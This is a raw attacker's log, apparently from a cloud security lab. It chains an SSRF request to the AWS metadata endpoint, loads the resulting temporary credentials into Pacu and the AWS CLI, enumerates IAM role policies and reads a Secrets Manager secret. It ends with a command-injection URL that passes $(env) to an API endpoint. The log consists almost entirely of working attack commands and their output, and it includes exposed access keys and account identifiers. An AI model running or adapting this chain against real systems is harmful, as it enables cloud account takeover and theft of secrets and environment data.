http://hackerone.etercloud.com/api/animales.php?url=http://169.254.169.254/latest/user-data

ami-id ami-launch-index ami-manifest-path autoscaling/ block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ system

# 1. Clona el repositorio
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# 2. Crea un entorno virtual (recomendado)
python3 -m venv venv
source venv/bin/activate

# 3. Instala dependencias
pip install -r requirements.txt

# 4. Ejecuta Pacu
python3 pacu.py

curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive-keyring.gpg


Pacu (first_PTaws:No Keys Set) > set_keys
Setting AWS Keys...
Press enter to keep the value currently stored.
Enter the letter C to clear the value, rather than set it.
If you enter an existing key_alias, that key's fields will be updated instead of added.
Key alias must be at least 2 characters

Key alias [None]: demo
Access key ID [None]: ASIAW3MEDRMYITJOHILC
Secret access key [None]: Z1fKhCGfBBS5IYsqUDYqe/oo9Eqb4a+kESy94xGV
Session token (Optional - for temp AWS keys only) [None]: IQoJb3JpZ2luX2VjENH//////////wEaCX

Pacu (first_PTaws:demo) > aws sts get-caller-identity
{
    "UserId": "AROAW3MEDRMYOTHTE2Q43:i-0fb51ccca173174f9",
    "Account": "471112846128",
    "Arn": "arn:aws:sts::471112846128:assumed-role/RCE-ENTRYPOINT-Role/i-0fb51ccca173174f9"
}

Pacu (first_PTaws:demo) > 




_________________________________
┌─[✗]─[kmxbay@parrot]─[~]
└──╼ $aws configure
AWS Access Key ID [None]: ASIAW3MEDRMYITJOHILC
AWS Secret Access Key [None]: Z1fKhCGfBBS5IYsqUDYqe/oo9Eqb4a+kESy94xGV
Default region name [None]: us-east-1
Default output format [None]: json
┌─[kmxbay@parrot]─[~]
┌─[kmxbay@parrot]─[~]
└──╼ $nano ~/.aws/credentials
agregar la linea
aws_session_token = IQoJb3JpZ2luX2VjEN
-----------------------------------------
┌─[kmxbay@parrot]─[~]
└──╼ $aws sts get-caller-identity
{
    "UserId": "AROAW3MEDRMYOTHTE2Q43:i-0fb51ccca173174f9",
    "Account": "471112846128",
    "Arn": "arn:aws:sts::471112846128:assumed-role/RCE-ENTRYPOINT-Role/i-0fb51ccca173174f9"
}
┌─[kmxbay@parrot]─[~]
└──╼ $nano ~/.aws/credentials
┌─[kmxbay@parrot]─[~]
└──╼ $^C
┌─[✗]─[kmxbay@parrot]─[~]
└──╼ $aws iam list-attached-role-policies --role-name RCE-ENTRYPOINT-Role
{
    "AttachedPolicies": [
        {
            "PolicyName": "RCE-ENTRYPOINT-SecretsManagerReadPolicy",
            "PolicyArn": "arn:aws:iam::471112846128:policy/RCE-ENTRYPOINT-SecretsManagerReadPolicy"
        },
        {
            "PolicyName": "RCE-ENTRYPOINT-SelfRolePermissionsPolicy",
            "PolicyArn": "arn:aws:iam::471112846128:policy/RCE-ENTRYPOINT-SelfRolePermissionsPolicy"
        }
    ]
}
┌─[kmxbay@parrot]─[~]
└──╼ $aws iam get-policy --policy-arn arn:aws:iam::471112846128:policy/RCE-ENTRYPOINT-SecretsManagerReadPolicy
{
{
    "Policy": {
        "PolicyName": "RCE-ENTRYPOINT-SecretsManagerReadPolicy",
        "PolicyId": "ANPAW3MEDRMYNDVWE6CPL",
        "Arn": "arn:aws:iam::471112846128:policy/RCE-ENTRYPOINT-SecretsManagerReadPolicy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Permite a la instancia EC2 leer secretos de AWS Secrets Manager",
        "CreateDate": "2025-05-30T00:33:32+00:00",
        "UpdateDate": "2025-05-30T00:33:32+00:00",
        "Tags": [
            {
                "Key": "Project",
                "Value": "WebAppDemo"
            },
            {
                "Key": "Environment",
                "Value": "development"
            },
            {
                "Key": "ManagedBy",
                "Value": "Terraform"
            },
            {
                "Key": "Name",
                "Value": "RCE-ENTRYPOINT-SecretsManagerReadPolicy"
┌─[kmxbay@parrot]─[~]
└──╼ $aws  iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::471112846128:policy/RCE-ENTRYPOINT-SecretsManagerReadPolicy
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "secretsmanager:ListSecrets",
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-05-30T00:33:32+00:00"
    }
}
┌─[kmxbay@parrot]─[~]
└──╼ $aws secretsmanager get-secret-value --secret-id WebAppDemo/api_endpoint
{
    "ARN": "arn:aws:secretsmanager:us-east-1:471112846128:secret:WebAppDemo/api_endpoint-UePmoT",
    "Name": "WebAppDemo/api_endpoint",
    "VersionId": "terraform-2025053000335276060000000a",
    "SecretString": "https://fhk4sxsmz3.execute-api.us-east-1.amazonaws.com/dev/hello",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-05-29T18:33:52.796000-06:00"
}



https://fhk4sxsmz3.execute-api.us-east-1.amazonaws.com/dev/hello?op=2&message=$(env)